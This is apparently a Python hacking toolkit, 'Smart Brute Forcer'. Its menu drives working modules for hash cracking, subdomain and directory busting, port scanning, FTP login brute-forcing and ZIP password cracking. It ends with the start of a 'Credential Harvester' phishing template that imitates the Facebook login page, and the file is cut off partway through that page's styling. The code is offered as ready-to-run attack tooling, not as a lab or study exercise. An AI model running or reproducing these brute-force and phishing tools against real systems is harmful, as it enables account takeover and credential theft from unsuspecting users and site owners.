import hashlib
import time
import multiprocessing
import sys
import math
from itertools import product
import os
import socket
import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed
import ftplib
import zipfile
import re
import base64
import http.server
import socketserver
import threading
import ast

# Try to import optional libraries independently
def check_lib(lib_name):
    try:
        __import__(lib_name)
        return True
    except ImportError:
        return False

# Individual library status
YFINANCE_INSTALLED = check_lib("yfinance")
MATPLOTLIB_INSTALLED = check_lib("matplotlib")
PANDAS_INSTALLED = check_lib("pandas")
NUMPY_INSTALLED = check_lib("numpy")
REQUESTS_INSTALLED = check_lib("requests")
WHOIS_INSTALLED = check_lib("whois")
PARAMIKO_INSTALLED = check_lib("paramiko")

# pywifi needs special handling for 'const' and often requires comtypes on Windows
try:
    import pywifi
    from pywifi import const
    PYWIFI_INSTALLED = True
    PYWIFI_ERROR = None
except ImportError as e:
    PYWIFI_INSTALLED = False
    PYWIFI_ERROR = str(e)
except Exception as e:
    PYWIFI_INSTALLED = False
    PYWIFI_ERROR = str(e)

# Global flag for the original menu logic
ADDITIONAL_LIBS_INSTALLED = all([YFINANCE_INSTALLED, MATPLOTLIB_INSTALLED, PANDAS_INSTALLED, NUMPY_INSTALLED, REQUESTS_INSTALLED, WHOIS_INSTALLED])

# Re-import for use in code
if YFINANCE_INSTALLED: import yfinance as yf
if MATPLOTLIB_INSTALLED: import matplotlib.pyplot as plt
if PANDAS_INSTALLED: import pandas as pd
if NUMPY_INSTALLED: import numpy as np
if REQUESTS_INSTALLED: import requests
if WHOIS_INSTALLED: import whois
if PARAMIKO_INSTALLED: import paramiko

# =================================================================================================
# CORE LOGIC (CLASSES AND WORKERS)
# =================================================================================================

CHARSETS = {
    '?l': 'abcdefghijklmnopqrstuvwxyz',
    '?u': 'ABCDEFGHIJKLMNOPQRSTUVWXYZ',
    '?d': '0123456789',
    '?s': '!@#$%^&*()-_=+[]{}|;:,.<>?/~`'
}

def crack_worker(args):
    worker_id, num_workers, target_hash, hash_algo, mask_components, total_combinations, found_event, result_queue, stats_queue = args
    start_index = worker_id * total_combinations // num_workers
    end_index = (worker_id + 1) * total_combinations // num_workers
    charsets = [CHARSETS[comp] for comp in mask_components]
    len_prods = [1] * len(charsets)
    for i in range(len(charsets) - 2, -1, -1):
        len_prods[i] = len_prods[i+1] * len(charsets[i+1])
    local_count = 0
    for i in range(start_index, end_index):
        if found_event.is_set(): return
        temp_i, candidate_chars = i, []
        for j in range(len(charsets)):
            charset_index = temp_i // len_prods[j]
            candidate_chars.append(charsets[j][charset_index])
            temp_i %= len_prods[j]
        candidate = "".join(candidate_chars)
        h = hashlib.new(hash_algo); h.update(candidate.encode('utf-8'))
        if h.hexdigest() == target_hash: 
            result_queue.put(candidate); found_event.set(); return
        local_count += 1
        if local_count % 20000 == 0: stats_queue.put(local_count); local_count = 0
    if local_count > 0: stats_queue.put(local_count)

class HashCracker:
    def __init__(self, hash_to_crack: str, mask: str):
        self.hash_to_crack, self.mask = hash_to_crack.lower(), mask
        self.hash_algo = self._detect_hash_type(self.hash_to_crack)
        self.mask_components = self._parse_mask(self.mask)
        if not self.hash_algo: raise ValueError(f"Could not determine hash type for hash of length {len(self.hash_to_crack)}.")
        if not self.mask_components: raise ValueError("Invalid mask format.")
        self.total_combinations = math.prod(len(CHARSETS[comp]) for comp in self.mask_components)

    def _detect_hash_type(self, hash_str: str) -> str:
        hash_len = len(hash_str)
        if hash_len == 32: return 'md5'
        if hash_len == 40: return 'sha1'
        if hash_len == 64: return 'sha256'
        return None

    def _parse_mask(self, mask: str) -> list:
        return re.findall(r'(\?[lusd])', mask)

    def _display_progress(self, start_time, tested_count):
        elapsed_time = time.time() - start_time or 1e-6
        hps = tested_count / elapsed_time
        eta = (self.total_combinations - tested_count) / hps if hps > 0 else float('inf')
        eta_str = time.strftime('%H:%M:%S', time.gmtime(eta)) if eta != float('inf') else 'N/A'
        progress = (tested_count / self.total_combinations) * 100
        sys.stdout.write(f"\r{Colors.WHITE}[+] Progress: {progress:.2f}% | H/s: {hps:,.0f} | ETA: {eta_str}    {Colors.RESET}"); sys.stdout.flush()

    def crack(self):
        num_workers = multiprocessing.cpu_count()
        print(f"{Colors.BLUE}[*] Engaging {num_workers} workers...{Colors.RESET}")
        print(f"[*] Target Hash: {self.hash_to_crack} ({self.hash_algo})")
        with multiprocessing.Manager() as manager:
            found_event, result_queue, stats_queue = manager.Event(), manager.Queue(), manager.Queue()
            args = (self.hash_algo, self.mask_components, self.total_combinations, found_event, result_queue, stats_queue)
            worker_args = [(i, num_workers, self.hash_to_crack, *args) for i in range(num_workers)]
            user_cancelled = False
            try:
                with multiprocessing.Pool(processes=num_workers) as pool:
                    pool.map_async(crack_worker, worker_args)
                    start_time, total_tested = time.time(), 0
                    while not found_event.is_set():
                        if not any(p.is_alive() for p in multiprocessing.active_children()): break
                        while not stats_queue.empty(): total_tested += stats_queue.get()
                        self._display_progress(start_time, total_tested)
                        if total_tested >= self.total_combinations: break
                        time.sleep(0.1)
            except KeyboardInterrupt:
                print(f"\n{Colors.RED}[!] Operator terminated process. Shutting down...{Colors.RESET}"); user_cancelled = True; found_event.set()
            sys.stdout.write('\r' + ' ' * 80 + '\r')
            if found_event.is_set() and not user_cancelled:
                try: print(f"{Colors.GREEN}{Colors.BOLD}[SUCCESS] Password found: {result_queue.get_nowait()}{Colors.RESET}")
                except Exception: print(f"{Colors.RED}[!] Race condition: Event set, but password queue empty.{Colors.RESET}")
            elif user_cancelled: print(f"{Colors.PURPLE}[CANCELLED] Process aborted by operator.{Colors.RESET}")
            else: print(f"{Colors.RED}[FAILURE] Password not found.{Colors.RESET}")

# =================================================================================================
# UI AND MENU FUNCTIONS
# =================================================================================================

class Colors:
    RESET, BOLD, RED, GREEN, YELLOW, BLUE, PURPLE, CYAN, WHITE, GRAY = '\033[0m', '\033[1m', '\033[31m', '\033[32m', '\033[33m', '\033[34m', '\033[35m', '\033[36m', '\033[37m', '\033[90m'

def display_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = f"""
{Colors.GRAY}{Colors.BOLD}
{Colors.RESET}
{Colors.BLUE}{Colors.BOLD}   ██████╗███╗   ███╗ █████╗ ██████╗ ████████╗
  ██╔════╝████╗ ████║██╔══██╗██╔══██╗╚══██╔══╝
  ╚█████╗ ██╔████╔██║███████║██████╔╝   ██║   
   ╚═══██╗██║╚██╔╝██║██╔══██║██╔══██╗   ██║   
  ██████╔╝██║ ╚═╝ ██║██║  ██║██║  ██║   ██║   
  ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
                                              
  ██████╗ ██████╗ ██╗   ██╗████████╗███████╗
  ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝
  ██████╔╝██████╔╝██║   ██║   ██║   █████╗  
  ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  
  ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗
  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝
                                              
  ███████╗ ██████╗ ██████╗  ██████╗███████╗██████╗ 
  ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝██╔══██╗
  █████╗  ██║   ██║██████╔╝██║     █████╗  ██████╔╝
  ██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝  ██╔══██╗
  ██║     ╚██████╔╝██║  ██║╚██████╗███████╗██║  ██║
  ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝  ╚═╝
{Colors.RESET}
{Colors.PURPLE}{Colors.BOLD}    [ The Quieter You Become, The More You Are Able To Hear ]
{Colors.RESET}
"""
    print(banner)
    print(f"{Colors.BLUE}       <//> THE SMART BRUTE FORCER | Weaver-Class Toolkit <//>{Colors.RESET}")
    print(f"{Colors.BLUE}     <//> Coded by Mc Alexis | Inspired by The Gemini <//{Colors.RESET}")
    print(f"{Colors.BLUE}" + "=" * 65 + f"{Colors.RESET}")

def get_prompt(): return f"{Colors.BLUE}{Colors.BOLD}┌──({Colors.PURPLE}root@kali{Colors.BLUE})-[{Colors.WHITE}~{Colors.BLUE}]\n└─{Colors.PURPLE}# {Colors.RESET}"
def pause(): input(f"\n{Colors.BLUE}[{Colors.PURPLE}!{Colors.BLUE}] Press Enter to return to menu...{Colors.RESET}")

# --- Individual Tool UIs (Leaf Functions) ---

def start_cracker_ui():
    display_banner(); print(f"{Colors.BLUE}{Colors.BOLD}//===[ HASH CRACKER MODULE ]===//{Colors.RESET}\n")
    try:
        hash_to_crack = input(f"{Colors.BLUE}[+] Target Hash: {Colors.RESET}")
        mask = input(f"{Colors.BLUE}[+] Mask Pattern (e.g., ?u?l?d?d): {Colors.RESET}")
        if not hash_to_crack or not mask: print(f"\n{Colors.RED}[!] Hash and mask cannot be empty.{Colors.RESET}"); return
        cracker = HashCracker(hash_to_crack=hash_to_crack, mask=mask); cracker.crack()
    except Exception as e: print(f"\n{Colors.RED}[!] Error initializing cracker: {e}{Colors.RESET}")

def hash_generator_ui():
    display_banner(); print(f"{Colors.BLUE}{Colors.BOLD}//===[ HASH GENERATOR ]===//{Colors.RESET}\n")
    text_to_hash = input(f"{Colors.BLUE}[+] Enter text to hash: {Colors.RESET}")
    if not text_to_hash: print(f"\n{Colors.RED}[!] Input cannot be empty.{Colors.RESET}"); return
    print("\n" + "="*70)
    for algo in ['md5', 'sha1', 'sha256', 'sha512']:
        h = hashlib.new(algo); h.update(text_to_hash.encode())
        print(f"{algo.upper():<8}: {Colors.WHITE}{h.hexdigest()}{Colors.RESET}")
    print("="*70)

def base64_ui():
    display_banner(); print(f"{Colors.BLUE}{Colors.BOLD}//===[ BASE64 ENCODER / DECODER ]===//{Colors.RESET}\n")
    print(f" {Colors.PURPLE}[1]{Colors.RESET} Encode to Base64{Colors.RESET}\n {Colors.PURPLE}[2]{Colors.RESET} Decode from Base64{Colors.RESET}\n")
    choice = input(get_prompt())
    if choice == '1':
        text_to_encode = input(f"{Colors.BLUE}[+] Enter text to encode: {Colors.RESET}").encode()
        print(f"\n{Colors.GREEN}Encoded:{Colors.RESET} {Colors.WHITE}{base64.b64encode(text_to_encode).decode()}{Colors.RESET}")
    elif choice == '2':
        text_to_decode = input(f"{Colors.BLUE}[+] Enter Base64 to decode: {Colors.RESET}")
        try: print(f"\n{Colors.GREEN}Decoded:{Colors.RESET} {Colors.WHITE}{base64.b64decode(text_to_decode).decode()}{Colors.RESET}")
        except Exception as e: print(f"\n{Colors.RED}[!] Invalid Base64 or decoding error: {e}{Colors.RESET}")
    else: print(f"\n{Colors.RED}[!] Invalid choice.{Colors.RESET}")

# --- Menu Functions (Branch Functions) ---

def crypto_menu():
    menu_map = {'1': ("Hash Cracker", start_cracker_ui), '2': ("Hash Generator", hash_generator_ui), '3': ("Base64 Util", base64_ui)}
    while True:
        display_banner(); print(f"{Colors.BLUE}{Colors.BOLD}//===[ CRYPTOGRAPHY MODULES ]===//{Colors.RESET}\n")
        for key, (name, _) in menu_map.items(): print(f" {Colors.PURPLE}[{key}]{Colors.WHITE} {name}{Colors.RESET}")
        print(f" {Colors.PURPLE}[9]{Colors.WHITE} Return to Mainframe{Colors.RESET}\n")
        choice = input(get_prompt())
        if choice in menu_map: menu_map[choice][1](); pause()
        elif choice == '9': return
        else: print(f"\n{Colors.RED}[!] Invalid command.{Colors.RESET}"); time.sleep(1)

def subdomain_scanner_ui():
    display_banner(); print(f"{Colors.BLUE}{Colors.BOLD}//===[ SUBDOMAIN SCANNER ]===//{Colors.RESET}\n")
    if not ADDITIONAL_LIBS_INSTALLED: print(f"{Colors.RED}[!] Libs not found. Run 'pip install -r requirements.txt'{Colors.RESET}"); return
    domain = input(f"{Colors.BLUE}[+] Target Domain (e.g., example.com): {Colors.RESET}")
    wordlist_path = input(f"{Colors.BLUE}[+] Path to Subdomain Wordlist: {Colors.RESET}")
    if not all([domain, wordlist_path]): print(f"\n{Colors.RED}[!] Domain and wordlist are required.{Colors.RESET}"); return
    if not os.path.exists(wordlist_path): print(f"\n{Colors.RED}[!] Wordlist not found: {wordlist_path}{Colors.RESET}"); return
    print(f"\n{Colors.BLUE}[*] Starting subdomain scan for {domain}...{Colors.RESET}")
    with open(wordlist_path, 'r', errors='ignore') as f: subdomains = [line.strip() for line in f if line.strip()]
    found_subdomains = []
    def check_subdomain(sub):
        try:
            url = f"http://{sub}.{domain}"
            requests.get(url, timeout=3)
            return url
        except requests.ConnectionError: return None
    with ThreadPoolExecutor(max_workers=50) as executor:
        future_to_sub = {executor.submit(check_subdomain, sub): sub for sub in subdomains}
        for i, future in enumerate(as_completed(future_to_sub)):
            sys.stdout.write(f"\r{Colors.WHITE}[*] Progress: {((i + 1) / len(subdomains)) * 100:.1f}%{Colors.RESET}"); sys.stdout.flush()
            if result := future.result():
                print(f"\r{Colors.GREEN}[+] Found: {result}{' ' * 40}{Colors.RESET}"); found_subdomains.append(result)
    if not found_subdomains: print(f"\n\n{Colors.PURPLE}[*] Scan complete. No subdomains found.{Colors.RESET}")
    else: print(f"\n\n{Colors.GREEN}[*] Scan complete. Found {len(found_subdomains)} subdomain(s).{Colors.RESET}")

def dir_buster_ui():
    display_banner(); print(f"{Colors.BLUE}{Colors.BOLD}//===[ DIRECTORY BUSTER ]===//{Colors.RESET}\n")
    if not ADDITIONAL_LIBS_INSTALLED: print(f"{Colors.RED}[!] Libs not found. Run 'pip install -r requirements.txt'{Colors.RESET}"); return
    url = input(f"{Colors.BLUE}[+] Target URL (e.g., http://example.com): {Colors.RESET}")
    wordlist_path = input(f"{Colors.BLUE}[+] Path to Directory Wordlist: {Colors.RESET}")
    if not all([url, wordlist_path]): print(f"\n{Colors.RED}[!] URL and wordlist are required.{Colors.RESET}"); return
    if not os.path.exists(wordlist_path): print(f"\n{Colors.RED}[!] Wordlist not found: {wordlist_path}{Colors.RESET}"); return
    print(f"\n{Colors.BLUE}[*] Starting directory busting on {url}...{Colors.RESET}")
    with open(wordlist_path, 'r', errors='ignore') as f: paths = [line.strip() for line in f if line.strip()]
    for i, path in enumerate(paths):
        target_url = f"{url.rstrip('/')}/{path}"
        sys.stdout.write(f"\r{Colors.WHITE}[*] Progress: {((i + 1) / len(paths)) * 100:.1f}% | Checking: /{path}{' ' * 20}{Colors.RESET}"); sys.stdout.flush()
        try:
            response = requests.head(target_url, timeout=3, allow_redirects=False)
            if response.status_code in [200, 204, 301, 302, 307, 401, 403]:
                print(f"\r{Colors.GREEN}[+] Found: {target_url} (Status: {response.status_code}){' ' * 40}{Colors.RESET}")
        except requests.RequestException: continue
    print(f"\n\n{Colors.PURPLE}[*] Directory busting complete.{Colors.RESET}")

def whois_ui():
    display_banner(); print(f"{Colors.BLUE}{Colors.BOLD}//===[ WHOIS LOOKUP ]===//{Colors.RESET}\n")
    if not ADDITIONAL_LIBS_INSTALLED: print(f"{Colors.RED}[!] Libs not found. Run 'pip install -r requirements.txt'{Colors.RESET}"); return
    domain = input(f"{Colors.BLUE}[+] Enter domain for Whois lookup (e.g., example.com): {Colors.RESET}")
    if not domain: print(f"\n{Colors.RED}[!] Domain cannot be empty.{Colors.RESET}"); return
    print(f"\n{Colors.BLUE}[*] Performing Whois lookup for {domain}...{Colors.RESET}")
    try:
        w = whois.whois(domain)
        if w.domain_name: print(f"\n{Colors.WHITE}{w}{Colors.RESET}")
        else: print(f"\n{Colors.RED}[!] No Whois information found for {domain}.{Colors.RESET}")
    except Exception as e: print(f"\n{Colors.RED}[!] Whois lookup failed: {e}{Colors.RESET}")

def network_scanner_menu():
    display_banner(); print(f"{Colors.BLUE}{Colors.BOLD}//===[ NETWORK SCANNER ]===//{Colors.RESET}\n")
    target = input(f"{Colors.BLUE}[+] Target IP address: {Colors.RESET}")
    ports_str = input(f"{Colors.BLUE}[+] Port range (e.g., 1-1024): {Colors.RESET}")

    if not target or not ports_str:
        print(f"\n{Colors.RED}[!] Target IP and port range are required.{Colors.RESET}")
        return

    try:
        start_port, end_port = map(int, ports_str.split('-'))
        if start_port > end_port:
            print(f"\n{Colors.RED}[!] Invalid port range.{Colors.RESET}")
            return
    except ValueError:
        print(f"\n{Colors.RED}[!] Invalid port range format. Use start-end (e.g., 1-1024).{Colors.RESET}")
        return

    print(f"\n{Colors.BLUE}[*] Scanning {target} for open ports...{Colors.RESET}")
    open_ports = []

    def scan_port(port):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.5)
                if s.connect_ex((target, port)) == 0:
                    return port
        except socket.gaierror:
            return None
        except Exception:
            return None
        return None

    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = {executor.submit(scan_port, port): port for port in range(start_port, end_port + 1)}
        for i, future in enumerate(as_completed(futures)):
            sys.stdout.write(f"\r{Colors.WHITE}[*] Progress: {((i + 1) / (end_port - start_port + 1)) * 100:.1f}%{Colors.RESET}"); sys.stdout.flush()
            result = future.result()
            if result is not None:
                print(f"\r{Colors.GREEN}[+] Port {result} is open.{' ' * 40}{Colors.RESET}")
                open_ports.append(result)

    if not open_ports:
        print(f"\n\n{Colors.PURPLE}[*] Scan complete. No open ports found in the specified range.{Colors.RESET}")
    else:
        print(f"\n\n{Colors.GREEN}[*] Scan complete. Found {len(open_ports)} open port(s).{Colors.RESET}")

def ftp_brute_force_ui():
    display_banner(); print(f"{Colors.BLUE}{Colors.BOLD}//===[ FTP BRUTE-FORCE ]===//{Colors.RESET}\n")
    server = input(f"{Colors.BLUE}[+] FTP Server IP: {Colors.RESET}")
    username = input(f"{Colors.BLUE}[+] Username: {Colors.RESET}")
    wordlist_path = input(f"{Colors.BLUE}[+] Path to Password Wordlist: {Colors.RESET}")

    if not all([server, username, wordlist_path]):
        print(f"\n{Colors.RED}[!] Server, username, and wordlist path are required.{Colors.RESET}")
        return

    if not os.path.exists(wordlist_path):
        print(f"\n{Colors.RED}[!] Wordlist not found at: {wordlist_path}{Colors.RESET}")
        return

    print(f"\n{Colors.BLUE}[*] Starting FTP brute-force on {server} for user '{username}'...{Colors.RESET}")
    found_event = multiprocessing.Event()

    def try_password(password, found_event):
        if found_event.is_set():
            return None
        ftp = None
        try:
            ftp = ftplib.FTP(server, timeout=5)
            ftp.login(username, password)
            print(f"\r{Colors.GREEN}{Colors.BOLD}[SUCCESS] Login successful! Password: {password}{' ' * 40}{Colors.RESET}")
            found_event.set()
            return password
        except ftplib.error_perm:
            return None
        except Exception:
            return None
        finally:
            if ftp:
                try:
                    ftp.quit()
                except Exception:
                    pass

    with open(wordlist_path, 'r', errors='ignore') as f:
        passwords = [line.strip() for line in f if line.strip()]

    found_password = None
    with ThreadPoolExecutor(max_workers=20) as executor:
        future_to_pass = {executor.submit(try_password, p, found_event): p for p in passwords}
        for i, future in enumerate(as_completed(future_to_pass)):
            if found_event.is_set():
                break
            sys.stdout.write(f"\r{Colors.WHITE}[*] Progress: {((i + 1) / len(passwords)) * 100:.1f}% | Testing: {future_to_pass[future]:<20}{Colors.RESET}"); sys.stdout.flush()
            result = future.result()
            if result:
                found_password = result
                # Cancel remaining futures
                for f in future_to_pass:
                    f.cancel()
                break

    if found_password:
        print(f"\n\n{Colors.GREEN}[*] Attack finished. Password found!{Colors.RESET}")
    else:
        print(f"\n\n{Colors.PURPLE}[*] Attack finished. Password not found in wordlist.{Colors.RESET}")

def tshark_capture_ui():
    display_banner(); print(f"{Colors.BLUE}{Colors.BOLD}//===[ TSHARK LIVE PACKET CAPTURE ]===//{Colors.RESET}\n")

    try:
        subprocess.run(['tshark', '--version'], check=True, capture_output=True)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print(f"{Colors.RED}[!] TShark not found. Please install Wireshark and ensure 'tshark' is in your system's PATH.{Colors.RESET}")
        return

    print(f"{Colors.BLUE}[*] Discovering network interfaces...{Colors.RESET}")
    selected_iface = ''
    try:
        result = subprocess.run(['tshark', '-D'], check=True, capture_output=True, text=True, timeout=10)
        interfaces_output = result.stdout + result.stderr
        interfaces = [line.strip() for line in interfaces_output.splitlines() if line.strip() and not line.startswith('tshark:') and not line.startswith('Capturing on')]
        
        if not interfaces:
            print(f"{Colors.WHITE}[!] Could not auto-detect interfaces. Please enter one manually.{Colors.RESET}")
        else:
            print(f"{Colors.WHITE}Available Interfaces:{Colors.RESET}")
            for i, iface in enumerate(interfaces, 1):
                print(f"  [{i}] {iface}")
            print("")
            choice = input(f"{Colors.BLUE}[+] Select interface (number) or enter name: {Colors.RESET}")
            if choice.isdigit() and 1 <= int(choice) <= len(interfaces):
                # On Windows, tshark -i "N" works, where N is the number.
                # On Linux, we need the name. The tshark -D output format is "N. name (description)"
                # Let's try to be smart about it.
                selected_iface_line = interfaces[int(choice) - 1]
                # Try to extract the name, otherwise fallback to number.
                match = re.match(r'\d+\.\s+([^\s(]+)', selected_iface_line)
                if os.name != 'nt' and match:
                    selected_iface = match.group(1)
                else: # Fallback for Windows or if regex fails
                    selected_iface = str(int(choice))
            else:
                selected_iface = choice # User entered a name manually

    except Exception as e:
        print(f"\n{Colors.RED}[!] Error discovering interfaces: {e}{Colors.RESET}")
    
    if not selected_iface:
        selected_iface = input(f"{Colors.BLUE}[+] Enter interface name/number manually: {Colors.RESET}")
        if not selected_iface:
             print(f"\n{Colors.RED}[!] Interface is required.{Colors.RESET}")
             return

    try:
        packet_count = input(f"{Colors.BLUE}[+] Number of packets to capture (e.g., 50): {Colors.RESET}")
        count = int(packet_count)
    except ValueError:
        print(f"\n{Colors.RED}[!] Invalid number. Defaulting to 10.{Colors.RESET}")
        count = 10

    print(f"\n{Colors.BLUE}[*] Starting capture on interface '{selected_iface}' for {count} packets... (Press Ctrl+C to stop){Colors.RESET}")
    command = ['tshark', '-i', selected_iface, '-c', str(count)]
    
    try:
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate(timeout=60)
        
        print("\n" + "="*70)
        print(f"{Colors.GREEN}Capture Output:{Colors.RESET}")
        print(stdout)
        if stderr:
            print("\n" + "="*70)
            print(f"{Colors.PURPLE}Capture Errors/Warnings:{Colors.RESET}")
            print(stderr)
        print("="*70)
        print(f"\n{Colors.GREEN}[*] Capture complete.{Colors.RESET}")

    except FileNotFoundError:
        print(f"\n{Colors.RED}[!] TShark not found. Make sure it's in your system PATH.{Colors.RESET}")
    except subprocess.TimeoutExpired:
        print(f"\n{Colors.RED}[!] Capture timed out after 60 seconds.{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}[!] An error occurred during capture: {e}{Colors.RESET}")
        print(f"{Colors.PURPLE}  - Try running this tool with administrator/root privileges.{Colors.RESET}")
        print(f"{Colors.PURPLE}  - Ensure the selected interface '{selected_iface}' is correct.{Colors.RESET}")

def zip_cracker_ui():
    display_banner(); print(f"{Colors.BLUE}{Colors.BOLD}//===[ ZIP ARCHIVE CRACKER ]===//{Colors.RESET}\n")
    zip_path = input(f"{Colors.BLUE}[+] Path to ZIP file: {Colors.RESET}")
    wordlist_path = input(f"{Colors.BLUE}[+] Path to Password Wordlist: {Colors.RESET}")

    if not all([zip_path, wordlist_path]):
        print(f"\n{Colors.RED}[!] ZIP file path and wordlist path are required.{Colors.RESET}")
        return

    if not os.path.exists(zip_path):
        print(f"\n{Colors.RED}[!] ZIP file not found at: {zip_path}{Colors.RESET}")
        return
    if not os.path.exists(wordlist_path):
        print(f"\n{Colors.RED}[!] Wordlist not found at: {wordlist_path}{Colors.RESET}")
        return

    try:
        zip_file = zipfile.ZipFile(zip_path)
        is_encrypted = any(z.flag_bits & 0x1 for z in zip_file.infolist())
        if not is_encrypted:
             print(f"\n{Colors.PURPLE}[!] The ZIP file does not appear to be password protected.{Colors.RESET}")
             zip_file.close()
             return
    except zipfile.BadZipFile:
        print(f"\n{Colors.RED}[!] Invalid ZIP file.{Colors.RESET}")
        return
    except Exception as e:
        print(f"\n{Colors.RED}[!] An error occurred while opening the ZIP file: {e}{Colors.RESET}")
        return

    print(f"\n{Colors.BLUE}[*] Starting dictionary attack on {os.path.basename(zip_path)}...{Colors.RESET}")
    found_event = multiprocessing.Event()

    def try_password(password_bytes, found_event):
        if found_event.is_set():
            return None
        try:
            # Test the password on the first file in the archive
            zip_file.extract(zip_file.infolist()[0], pwd=password_bytes)
            return password_bytes.decode('utf-8', 'ignore')
        except (RuntimeError, zipfile.BadZipFile, zipfile.zlib.error):
            return None
        except Exception:
            return None

    with open(wordlist_path, 'r', errors='ignore') as f:
        passwords = [line.strip() for line in f if line.strip()]

    found_password = None
    with ThreadPoolExecutor(max_workers=multiprocessing.cpu_count() * 2) as executor:
        future_to_pass = {executor.submit(try_password, p.encode('utf-8', 'ignore'), found_event): p for p in passwords}
        for i, future in enumerate(as_completed(future_to_pass)):
            if found_event.is_set():
                break
            password_str = future_to_pass[future]
            sys.stdout.write(f"\r{Colors.WHITE}[*] Progress: {((i + 1) / len(passwords)) * 100:.1f}% | Testing: {password_str:<20}{Colors.RESET}"); sys.stdout.flush()
            result = future.result()
            if result:
                found_password = result
                print(f"\r{Colors.GREEN}{Colors.BOLD}[SUCCESS] Password found: {found_password}{' ' * 40}{Colors.RESET}")
                found_event.set()
                for f in future_to_pass:
                    f.cancel()
                break
    
    zip_file.close()
    if found_password:
        print(f"\n\n{Colors.GREEN}[*] Attack finished. Password found!{Colors.RESET}")
    else:
        print(f"\n\n{Colors.PURPLE}[*] Attack finished. Password not found in wordlist.{Colors.RESET}")

def spam_detector_ui():
    display_banner(); print(f"{Colors.BLUE}{Colors.BOLD}//===[ SPAM DETECTOR ]===//{Colors.RESET}\n")
    print(f"{Colors.BLUE}Enter the text/message to analyze. Press Ctrl+Z (Windows) or Ctrl+D (Unix) on a new line when done.{Colors.RESET}")
    lines = sys.stdin.readlines()
    text_to_analyze = "".join(lines)

    if not text_to_analyze.strip():
        print(f"\n{Colors.RED}[!] No text provided to analyze.{Colors.RESET}")
        return

    print(f"\n{Colors.BLUE}[*] Analyzing text for spam characteristics...{Colors.RESET}")
    
    score = 0
    reasons = []
    text_len = len(text_to_analyze)
    if text_len == 0: text_len = 1

    # Heuristic 1: Excessive uppercase
    uppercase_ratio = sum(1 for c in text_to_analyze if c.isupper()) / text_len
    if uppercase_ratio > 0.3:
        score += 20
        reasons.append(f"High uppercase ratio ({uppercase_ratio:.1%})")

    # Heuristic 2: Spammy keywords
    spam_words = [
        'free', 'win', 'winner', 'won', 'cash', 'prize', 'claim', 'collect',
        'urgent', 'immediate', 'action required', 'limited time', 'offer',
        'guaranteed', 'risk-free', 'no cost', 'congratulations', 'selected',
        'click here', 'unsubscribe', 'viagra', 'pharmacy', 'loan', 'investment'
    ]
    word_tokens = re.findall(r'\b\w+\b', text_to_analyze.lower())
    found_spam_words = list(set([word for word in spam_words if word in word_tokens]))
    if found_spam_words:
        spam_word_count = len(found_spam_words)
        score += spam_word_count * 10
        reasons.append(f"Found {spam_word_count} spam-related keywords (e.g., {', '.join(found_spam_words[:3])})")

    # Heuristic 3: Excessive punctuation/special characters
    special_char_ratio = sum(1 for c in text_to_analyze if not c.isalnum() and not c.isspace()) / text_len
    if special_char_ratio > 0.15:
        score += 15
        reasons.append(f"High ratio of special characters ({special_char_ratio:.1%})")

    # Heuristic 4: Presence of currency symbols
    if any(c in text_to_analyze for c in '€$£¥'):
        score += 15
        reasons.append("Contains currency symbols")
        
    # Heuristic 5: Urgency and Exclusivity
    if re.search(r'\b(act now|once in a lifetime|don\'t delete|for instant access)\b', text_to_analyze, re.IGNORECASE):
        score += 20
        reasons.append("Uses phrases creating urgency or exclusivity")

    # Final Evaluation
    score = min(score, 100)
    
    print("\n" + "="*70)
    print(f"{Colors.BOLD}Analysis Report:{Colors.RESET}")
    print(f"  - {Colors.WHITE}Spam Likelihood Score: {Colors.BOLD}{score}/100{Colors.RESET}")
    
    if score > 75:
        verdict = f"{Colors.RED}{Colors.BOLD}Highly Likely Spam{Colors.RESET}"
    elif score > 50:
        verdict = f"{Colors.YELLOW}{Colors.BOLD}Potentially Spam{Colors.RESET}"
    else:
        verdict = f"{Colors.GREEN}Likely Not Spam{Colors.RESET}"
    
    print(f"  - {Colors.WHITE}Verdict: {verdict}{Colors.RESET}")

    if reasons:
        print(f"\n{Colors.BOLD}Contributing Factors:{Colors.RESET}")
        for reason in reasons:
            print(f"  - {Colors.WHITE}{reason}{Colors.RESET}")
    print("="*70)

# Credential Harvester Templates
PHISHING_TEMPLATES = {
    '1': {
        'name': 'Facebook (Meta) Login 2025',
        'html': """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In or Sign Up</title>
    <style>
        :root { --fb-blue: #0866ff; --fb-bg: #f0f2f5; }
        body { font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: var(--fb-bg); margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .wrapper { display: flex; max-width: 980px; width: 100%; justify-content: space-between; align-items: center; padding: 20px; }
        .brand-section { width: 50%; padding-right: 32px; }
        .brand-section img { width: 300px; margin-left: -28px; }
        .brand-section h2 { font-size: 28px; font-weight: 400; line-height: 32px; color: #1c1e21; margin-top: -10px; }
        .login-card { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1); width: 396px; text-align: center; }
        input { width: 100%; padding: 14px 16px; margin: 6px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; box-sizing: border-box; outline: none; transition: border-color 0.2s; }
        input:focus { border-color: var(--fb-blue); box-shadow: 0 0 0 2px #e7f3ff; }
